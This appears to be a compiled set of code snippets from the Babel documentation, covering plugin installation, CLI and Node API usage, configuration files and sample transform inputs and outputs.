@babel/plugin-transform-modules-amd\nDESCRIPTION: This command shows how to install the plugin using npm. It adds the plugin as a development dependency to your project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-amd.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-modules-amd\n```\n\n----------------------------------------\n\nTITLE: Use Babel plugin via Node API\nDESCRIPTION: This JavaScript code snippet demonstrates how to use the @babel/plugin-syntax-optional-chaining plugin with the Babel Node API. It transforms the 'code' string using the plugin, enabling the parsing of the optional chaining syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-optional-chaining.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-optional-chaining\"]\n});\n```\n\n----------------------------------------\n\nTITLE: JavaScript: Parsing with Decorators Before Export\nDESCRIPTION: This code snippet demonstrates how to use the `decoratorsBeforeExport` option when parsing code with `@babel/parser` (formerly `babylon`). It enables parsing of decorators before the export keyword.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-09-17-decorators.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst ast = babylon.parse(code, {\n  plugins: [\n    [\"decorators\", { decoratorsBeforeExport: true }]\n  ]\n})\n```\n\n----------------------------------------\n\nTITLE: Printing Babel CLI Help\nDESCRIPTION: Displays the Babel CLI help information, listing all available options and their descriptions. This command is useful for understanding the available functionalities of the Babel CLI.\nSOURCE: https://github.com/babel/website/blob/main/docs/cli.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel --help\n```\n\n----------------------------------------\n\nTITLE: Installing Babel Loader and Babili Preset\nDESCRIPTION: This snippet shows how to install `babel-core`, `babel-loader`, and `babel-preset-babili` as dependencies using npm. These are needed to integrate Babili with Webpack through Babel Loader.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-08-26-babili.md#_snippet_10\n\nLANGUAGE: Shell\nCODE:\n```\n$ npm install babel-core babel-loader babel-preset-babili\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin (Node API)\nDESCRIPTION: Usage of the Babel Node API to transform code using the `transform-regexp-constructors` plugin.  Requires `@babel/core` package.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-regexp-constructors.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"transform-regexp-constructors\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Usage via Node API\nDESCRIPTION: This JavaScript code snippet demonstrates how to use the @babel/plugin-transform-destructuring plugin programmatically via the Node API. It uses `require(\"@babel/core\").transformSync` to transform the provided JavaScript code with the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-destructuring.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-destructuring\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Using Decorators with Classes in JavaScript\nDESCRIPTION: This code snippet demonstrates how to use decorators with classes in JavaScript using the `@babel/plugin-proposal-decorators` plugin.  The `@decorator` syntax is used to decorate the `method` of the `MyClass` class. Ensure the decorator plugin is configured in your Babel configuration.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-09-17-7.1.0.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass MyClass {\n  @decorator\n  method() {}\n}\n```\n\n----------------------------------------\n\nTITLE: Transforming with React JSX Source via Babel CLI\nDESCRIPTION: This command-line instruction uses the Babel CLI to transform a JavaScript file (script.js) using the `@babel/plugin-transform-react-jsx-source` plugin. It adds the source information to JSX during the transformation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-source.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-react-jsx-source script.js\n```\n\n----------------------------------------\n\nTITLE: Using Custom Babel Configuration File\nDESCRIPTION: Compiles files in the `./src` directory to the `dist` directory, using the specified configuration file `/path/to/my/babel.config.json`.  The `--config-file` option allows specifying a custom configuration file path.\nSOURCE: https://github.com/babel/website/blob/main/docs/cli.md#_snippet_18\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel --config-file /path/to/my/babel.config.json --out-dir dist ./src\n```\n\n----------------------------------------\n\nTITLE: babel.config.json rewriteImportExtensions\nDESCRIPTION: Example showing how to use the rewriteImportExtensions option.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-typescript.md#_snippet_7\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\n    [\"@babel/preset-typescript\", {\n      \"rewriteImportExtensions\": true\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Compiled Class Properties (setPublicClassFields = true)\nDESCRIPTION: Compiled output of the class properties example when `setPublicClassFields` is set to `true`. It uses assignment expressions for class properties.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-class-properties.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar Bork = function Bork() {\n  babelHelpers.classCallCheck(this, Bork);\n  this.x = \"bar\";\n  this.y = void 0;\n};\n\nBork.a = \"foo\";\nBork.b = void 0;\n```\n\n----------------------------------------\n\nTITLE: React JSX Input Example (JavaScript)\nDESCRIPTION: This code snippet demonstrates the React JSX code that will be transformed by the Babel plugin. It uses JSX syntax to define a simple profile component with an image and header.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-compat.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar profile = (\n  <div>\n    <img src=\"avatar.png\" class=\"profile\" />\n    <h3>{[user.firstName, user.lastName].join(\" \")}</h3>\n  </div>\n);\n```\n\n----------------------------------------\n\nTITLE: Transformed Class with @babel/runtime\nDESCRIPTION: Illustrates how `@babel/plugin-transform-runtime` replaces the duplicated `_classCallCheck` function with a `require` statement that imports it from the `@babel/runtime` package. This avoids code duplication and reduces the bundle size.\nSOURCE: https://github.com/babel/website/blob/main/docs/runtime.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nvar _classCallCheck = require(\"@babel/runtime/helpers/classCallCheck\");\n\nvar Circle = function Circle() {\n  _classCallCheck(this, Circle);\n};\n```\n\n----------------------------------------\n\nTITLE: Fixing Invalid JSX Key Attribute\nDESCRIPTION: This snippet demonstrates how to fix invalid JSX key attributes in Babel 8 by wrapping the sequence expression in parentheses. This change ensures valid JSX syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration.md#_snippet_15\n\nLANGUAGE: jsx\nCODE:\n```\n- <p key={foo, bar}></p> // Invalid\n+ <p key={(foo, bar)}></p> // Valid\n```\n\n----------------------------------------\n\nTITLE: Creating Class Method (JavaScript)\nDESCRIPTION: Creates a `ClassMethod` AST node. This node represents a method within a class. Parameters include the method's kind (`kind`), key (`key`), parameters (`params`), body (`body`), computed flag (`computed`), static flag (`static`), generator flag (`generator`), and async flag (`async`).\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_25\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.classMethod(kind, key, params, body, computed, static, generator, async);\n```\n\n----------------------------------------\n\nTITLE: Creating a BinaryExpression Node\nDESCRIPTION: Creates an AST node representing a binary expression. Requires `operator` (a string representing the operator), `left` (an `Expression | PrivateName`), and `right` (an `Expression`). Use `t.isBinaryExpression(node, opts)` to check if a node is a BinaryExpression and `t.assertBinaryExpression(node, opts)` to assert that a node is a BinaryExpression.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_11\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.binaryExpression(operator, left, right);\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin in babel.config.json\nDESCRIPTION: Configures the @babel/plugin-syntax-export-namespace-from plugin within a babel.config.json file. This enables Babel to parse the 'export namespace from' syntax during the transformation process.  This approach is recommended.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-export-namespace-from.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-export-namespace-from\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Using @babel/plugin-syntax-do-expressions via CLI\nDESCRIPTION: Executes the Babel CLI with the specified plugin to transform a JavaScript file. The @babel/plugin-syntax-do-expressions plugin enables parsing of do expressions during the transformation.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-do-expressions.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-do-expressions script.js\n```\n\n----------------------------------------\n\nTITLE: Configure Stage 3 Decorators in Babel\nDESCRIPTION: This configures Babel to use the Stage 3 decorators proposal, specifying the '2022-03' version in the plugin options. This activates the latest decorator syntax and features.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2022-09-05-7.19.0.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    [\"@babel/plugin-proposal-decorators\", {\n        \"version\": \"2022-03\"\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Use babel-plugin-minify-infinity via CLI Shell\nDESCRIPTION: This command demonstrates how to use the babel-plugin-minify-infinity plugin via the Babel CLI. It assumes that Babel CLI is installed globally or locally in the project.  It processes the `script.js` file using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-infinity.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins minify-infinity script.js\n```\n\n----------------------------------------\n\nTITLE: Transformed Class with Duplicated Helper\nDESCRIPTION: Shows the result of transforming a JavaScript class without using `@babel/plugin-transform-runtime`. Notice that the `_classCallCheck` function is included directly in the output.\nSOURCE: https://github.com/babel/website/blob/main/docs/runtime.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nfunction _classCallCheck(instance, Constructor) {\n  //...\n}\n\nvar Circle = function Circle() {\n  _classCallCheck(this, Circle);\n};\n```\n\n----------------------------------------\n\nTITLE: Configuring babel-preset-minify in babel.config.json\nDESCRIPTION: This JSON configuration shows how to enable the 'minify' preset in a babel.config.json file.  This is the recommended way to use the preset.  It can be passed without any options, or with a configuration object.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-minify.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\"minify\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Usage Via CLI\nDESCRIPTION: Command-line instruction showing how to use the plugin via the Babel CLI.  The --plugins flag specifies the plugin to use when transforming the script.js file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-classes.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-classes script.js\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel Plugin via babel.config.json\nDESCRIPTION: Configures Babel to use the @babel/plugin-syntax-export-default-from plugin by adding it to the plugins array in the babel.config.json file. This enables the plugin for all Babel transformations.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-export-default-from.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-export-default-from\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Transform Object.setPrototypeOf (Input)\nDESCRIPTION: This JavaScript code snippet demonstrates the input code that will be transformed by the Babel plugin. It uses Object.setPrototypeOf to set the prototype of 'bar' to 'foo'.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-set-prototype-of-to-assign.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nObject.setPrototypeOf(bar, foo);\n```\n\n----------------------------------------\n\nTITLE: Declaring a Babel Plugin\nDESCRIPTION: This code snippet demonstrates how to declare a Babel plugin using the `declare` function from `@babel/helper-plugin-utils`. It imports the `declare` function and exports a default function that takes the Babel API, options, and dirname as arguments. The plugin returns an empty object, indicating it doesn't perform any transformations by default. This ensures the basic structure of a babel plugin and helps with version compatibility.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-plugin-utils.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { declare } from \"@babel/helper-plugin-utils\";\n\nexport default declare((api, options, dirname) => {\n  return {};\n});\n```\n\n----------------------------------------\n\nTITLE: Installing @babel/runtime-corejs2 with npm\nDESCRIPTION: This command installs the `@babel/runtime-corejs2` package as a project dependency using npm. It's intended to be used with `@babel/plugin-transform-runtime` to avoid code duplication by referencing modular runtime helpers.\nSOURCE: https://github.com/babel/website/blob/main/docs/runtime-corejs2.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save @babel/runtime-corejs2\n```\n\n----------------------------------------\n\nTITLE: Transformed Node ENV Example\nDESCRIPTION: This shows the output after running the transform-node-env-inline babel plugin when `NODE_ENV` is set to `development`. `process.env.NODE_ENV === \"development\"` becomes `true` and `process.env.NODE_ENV === \"production\"` becomes `false`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-node-env-inline.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\ntrue;\nfalse;\n```\n\n----------------------------------------\n\nTITLE: Optional Catch Binding with Finally JavaScript\nDESCRIPTION: Demonstrates optional catch binding with a finally block.  The catch clause doesn't declare an exception variable.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-optional-catch-binding.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\ntry {\n  throw 0;\n} catch {\n  doSomethingWhichDoesNotCareAboutTheValueThrown();\n} finally {\n  doSomeCleanup();\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Babel with rootMode configuration\nDESCRIPTION: This command-line example demonstrates how to use the `--root-mode` option with `@babel/cli` to specify the project root resolution strategy. The `upward` mode instructs Babel to search for a `babel.config.json` file in parent directories.\nSOURCE: https://github.com/babel/website/blob/main/docs/options.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpx babel --root-mode upward file.js # equivalent of passing the rootMode config option\n```\n\n----------------------------------------\n\nTITLE: Setting BABEL_CACHE_PATH Environment Variable\nDESCRIPTION: This snippet demonstrates how to set the BABEL_CACHE_PATH environment variable to specify a custom location for the Babel cache file. This can be useful for managing cache files in specific directories.\nSOURCE: https://github.com/babel/website/blob/main/docs/register.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nBABEL_CACHE_PATH=/foo/my-cache.json babel-node script.js\n```\n\n----------------------------------------\n\nTITLE: Usage Via Node API\nDESCRIPTION: Demonstrates how to use the plugin programmatically via the Babel Node API.  The transformSync method is used to transform the code string with the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-classes.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-classes\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI - Shell\nDESCRIPTION: This command runs Babel via the command line interface, applying the @babel/plugin-transform-typeof-symbol plugin to the `script.js` file. The output will be written to standard output, or another file if specified using an output flag.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typeof-symbol.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-typeof-symbol script.js\n```\n\n----------------------------------------\n\nTITLE: JavaScript Example: Mangle Variable Names\nDESCRIPTION: This example demonstrates the effect of the babel-plugin-minify-mangle-names plugin. It shows how the plugin transforms JavaScript code by shortening local variable names while preserving global variable names.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-mangle-names.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar globalVariableName = 42;\nfunction foo() {\n  var longLocalVariableName = 1;\n  if (longLocalVariableName) {\n    console.log(longLocalVariableName);\n  }\n}\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar globalVariableName = 42;\nfunction foo() {\n  var a = 1;\n  if (a) {\n    console.log(a);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Transforming core-js Imports with @babel/preset-env in JavaScript\nDESCRIPTION: This code example demonstrates how @babel/preset-env with `core-js: 3` and `useBuiltIns: 'entry'` transforms `core-js` imports to specific modules for targeted environments (e.g., Chrome 72). This example shows how the import statements are converted to specific modules for polyfilling features supported by the specified environment.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-03-19-7.4.0.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport \"core-js/es\";\nimport \"core-js/proposals/set-methods\";\nimport \"core-js/features/set/map\";\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport \"core-js/modules/es.array.unscopables.flat\";\nimport \"core-js/modules/es.array.unscopables.flat-map\";\nimport \"core-js/modules/es.object.from-entries\";\nimport \"core-js/modules/esnext.set.difference\";\nimport \"core-js/modules/esnext.set.intersection\";\nimport \"core-js/modules/esnext.set.is-disjoint-from\";\nimport \"core-js/modules/esnext.set.is-subset-of\";\nimport \"core-js/modules/esnext.set.is-superset-of\";\nimport \"core-js/modules/esnext.set.map\";\nimport \"core-js/modules/esnext.set.symmetric-difference\";\nimport \"core-js/modules/esnext.set.union\";\n```\n\n----------------------------------------\n\nTITLE: Using @babel/helper-wrap-function in JavaScript\nDESCRIPTION: This snippet shows how to import and use the @babel/helper-wrap-function. The `wrapFunction` method takes the NodePath of the function to be wrapped and a Node which references to the wrapper as arguments. The function wraps the given function node path with a wrapper function.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-wrap-function.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport wrapFunction from \"@babel/helper-wrap-function\";\n\nwrapFunction(nodePathOfTheFunction, nodeWhichReferencesToTheWrapper);\n```\n\n----------------------------------------\n\nTITLE: Parsing Code with @babel/parser\nDESCRIPTION: The `babelParser.parse(code, [options])` function parses the provided `code` as an entire ECMAScript program. It returns an AST (Abstract Syntax Tree) representing the parsed code. The `code` parameter is the string of JavaScript code to parse, and the optional `options` parameter allows configuring the parser's behavior.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nbabelParser.parse(code, [options])\n```\n\n----------------------------------------\n\nTITLE: Use plugin via CLI\nDESCRIPTION: This command shows how to use the plugin directly from the command line when running Babel. It transforms the specified script file, using the dynamic import and AMD modules plugins.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-dynamic-import.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins=@babel/plugin-transform-dynamic-import,@babel/plugin-transform-modules-amd script.js\n```\n\n----------------------------------------\n\nTITLE: Transforming from AST Asynchronously\nDESCRIPTION: Illustrates how to use `babel.transformFromAst` to asynchronously transform an AST. It takes the AST, optional code string, options, and a callback. The callback receives an error object and a result object containing the transformed code, source map, and AST. It also requires babel.parseSync to generate the AST. This method is backward compatible but transformFromAstSync is recommended for synchronous needs in Babel 7+.\nSOURCE: https://github.com/babel/website/blob/main/docs/core.md#_snippet_13\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst sourceCode = \"if (true) return;\";\nconst parsedAst = babel.parseSync(sourceCode, {\n  parserOpts: { allowReturnOutsideFunction: true },\n});\nbabel.transformFromAst(parsedAst, sourceCode, options, function(err, result) {\n  const { code, map, ast } = result;\n});\n```\n\n----------------------------------------\n\nTITLE: Configure Babel with babel.config.json\nDESCRIPTION: Configures Babel to use the @babel/plugin-syntax-decorators plugin by adding it to the plugins array in the babel.config.json file. This enables decorator parsing in your project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-decorators.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-decorators\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Use Undefined to Void Plugin: Node API\nDESCRIPTION: This JavaScript code shows how to use the plugin via the Node API. It uses `@babel/core` to transform code with the `transform-undefined-to-void` plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-undefined-to-void.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"transform-undefined-to-void\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Parsing Expressions with @babel/parser\nDESCRIPTION: The `babelParser.parseExpression(code, [options])` function parses the provided `code` as a single ECMAScript expression. It's optimized for parsing single expressions with performance in mind. Use `.parse()` for parsing entire programs. The `code` parameter is the string of JavaScript code to parse, and the optional `options` parameter allows configuring the parser's behavior.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nbabelParser.parseExpression(code, [options])\n```\n\n----------------------------------------\n\nTITLE: Pipeline Operator: jQuery Status Quo vs With Pipes\nDESCRIPTION: This JavaScript code illustrates using the pipeline operator with jQuery's `jQuery.merge` and `jQuery.parseHTML` functions. The 'hack' proposal and '^^' topic token are used to streamline the jQuery initialization process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-pipeline-operator.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n// Status quo\njQuery.merge( this, jQuery.parseHTML(\n  match[ 1 ],\n  context && context.nodeType ? context.ownerDocument || context : document,\n  true\n) );\n\n// With pipes\ncontext\n  |> (^^ && ^^.nodeType ? ^^.ownerDocument || ^^ : document)\n  |> jQuery.parseHTML(match[1], ^^, true)\n  |> jQuery.merge(^^);\n```\n\n----------------------------------------\n\nTITLE: Installing Flow Preset (Shell)\nDESCRIPTION: This shell command shows how to install the @babel/preset-flow preset using npm or yarn. The --save-dev flag is used to install the preset as a development dependency. This preset enables Babel to strip Flow type annotations from JavaScript code.\nSOURCE: https://github.com/babel/website/blob/main/docs/index.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/preset-flow\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin\nDESCRIPTION: Command to install the @babel/plugin-transform-typescript package as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typescript.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-typescript\n```\n\n----------------------------------------\n\nTITLE: Configure 'loose' option in babel.config.json\nDESCRIPTION: Example showing how to set the 'setSpreadProperties' assumption to 'true' in babel.config.json.  This is related to the 'loose' option, and uses Babel's 'extends' helper, similar to Object.assign.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-rest-spread.md#_snippet_6\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"assumptions\": {\n    \"setSpreadProperties\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Loose Mode with Assumptions (JSON)\nDESCRIPTION: Configures the 'loose' mode using the 'privateFieldsAsProperties' and 'setPublicClassFields' assumptions in babel.config.json. Both assumptions must be set to true for loose mode to work correctly.  This impacts how private fields are accessed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-private-property-in-object.md#_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"assumptions\": {\n    \"privateFieldsAsProperties\": true,\n    \"setPublicClassFields\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration: Plugin with useBuiltIns Option\nDESCRIPTION: This JSON configuration file demonstrates how to enable the `useBuiltIns` option within the @babel/plugin-transform-destructuring plugin. Setting `useBuiltIns` to `true` will make the plugin use `Object.assign` directly instead of Babel's `extends` helper.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-destructuring.md#_snippet_7\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\n    [\"@babel/plugin-transform-destructuring\", { \"useBuiltIns\": true }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Compile and run test.js with babel-node\nDESCRIPTION: Compiles and executes the specified JavaScript file (test.js) using babel-node, allowing you to run ES6+ code directly without pre-compilation. Requires @babel/core and @babel/node to be installed.\nSOURCE: https://github.com/babel/website/blob/main/docs/node.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel-node test\n```\n\n----------------------------------------\n\nTITLE: Config: Babel Plugin Usage (With Options)\nDESCRIPTION: This JSON snippet demonstrates how to configure the babel-plugin-minify-mangle-names plugin in a Babel configuration file with options. Specifically, it shows how to exclude identifiers from being mangled using the `exclude` option.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-mangle-names.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\n    [\"minify-mangle-names\", { \"exclude\": { \"foo\": true, \"bar\": true} }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Transform RegExp 's' Modifier in Babel\nDESCRIPTION: Transforms a regular expression with the 's' (dotAll) modifier, allowing the dot (.) to match newline characters.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-regexp-modifiers.md#_snippet_2\n\nLANGUAGE: js\nCODE:\n```\n// matches \\na and aa, but not \\n\\n\nconst regex = /(?s:.)./\n```\n\nLANGUAGE: js\nCODE:\n```\nconst regex = /(?:[\\s\\S])./;\n```\n\n----------------------------------------\n\nTITLE: Installing Babel CLI Locally\nDESCRIPTION: Installs Babel CLI and Babel core as development dependencies using npm or yarn. This allows managing Babel versions per project, improving portability and avoiding environment-specific issues.  It is recommended to create a package.json file before installing.\nSOURCE: https://github.com/babel/website/blob/main/docs/cli.md#_snippet_0\n\nLANGUAGE: npm2yarn\nCODE:\n```\nnpm install --save-dev @babel/core @babel/cli\n```\n\n----------------------------------------\n\nTITLE: Object Rest Spread (JavaScript)\nDESCRIPTION: This snippet shows the default Babel 7 behavior for object rest spread, using the `_objectSpread` helper function for spec compliance.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_17\n\nLANGUAGE: javascript\nCODE:\n```\n// input\nz = { x, ...y };\n```\n\nLANGUAGE: javascript\nCODE:\n```\n// v7 default behavior: [\"proposal-object-rest-spread\"]\nfunction _objectSpread(target) { ... }\n\nz = _objectSpread({\n  x\n}, y);\n```\n\n----------------------------------------\n\nTITLE: Node API Usage\nDESCRIPTION: This JavaScript code shows how to use the Babel Node API to transform code with the @babel/plugin-transform-jscript plugin. It requires the @babel/core package and calls transformSync to perform the transformation.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-jscript.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-jscript\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Use Babel Preset Flow Node API JavaScript\nDESCRIPTION: This JavaScript code shows how to use the @babel/preset-flow preset with the Babel Node API to transform JavaScript code.  It uses require('@babel/core').transformSync.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-flow.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  presets: [\"@babel/preset-flow\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Babel Config: Pipeline Operator with ^^ Topic Token\nDESCRIPTION: This JSON configuration snippet configures the @babel/plugin-proposal-pipeline-operator with the 'hack' proposal and sets the topic token to '^^'.  This configuration is used in babel.config.json to enable the pipeline operator.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-pipeline-operator.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    [\"@babel/plugin-proposal-pipeline-operator\", { \"topicToken\": \"^^\" }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Custom Helpers\nDESCRIPTION: This snippet illustrates how helpers are defined internally within the Babel repository using the `defineHelper` function.  The custom helper imports a dependency, performs a calculation, and exports a default function.\nSOURCE: https://github.com/babel/website/blob/main/docs/helpers.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nhelpers.customHelper = defineHelper(`\n  import dep from \"dependency\";\n\n  const foo = 2;\n\n  export default function getFooTimesDepPlusX(x) {\n    return foo * dep() + x;\n  }\n`);\n```\n\n----------------------------------------\n\nTITLE: Use Babel plugin via Node API JavaScript\nDESCRIPTION: This JavaScript snippet demonstrates how to use the `@babel/plugin-syntax-import-attributes` plugin via the Node API.  The `require('@babel/core').transformSync` function transforms the given code using the specified plugins. The `plugins` option is passed as part of the options object.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-attributes.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-import-attributes\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Installation using npm/yarn\nDESCRIPTION: Command to install the @babel/plugin-transform-modules-systemjs plugin as a development dependency using npm or yarn. This is a prerequisite for using the plugin in a Babel project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-systemjs.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-modules-systemjs\n```\n\n----------------------------------------\n\nTITLE: Use Babel plugin via CLI Shell\nDESCRIPTION: This shell command shows how to use the `@babel/plugin-syntax-import-attributes` plugin via the Babel CLI. The `--plugins` option specifies the plugin to use when transforming the specified JavaScript file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-attributes.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-import-attributes script.js\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node 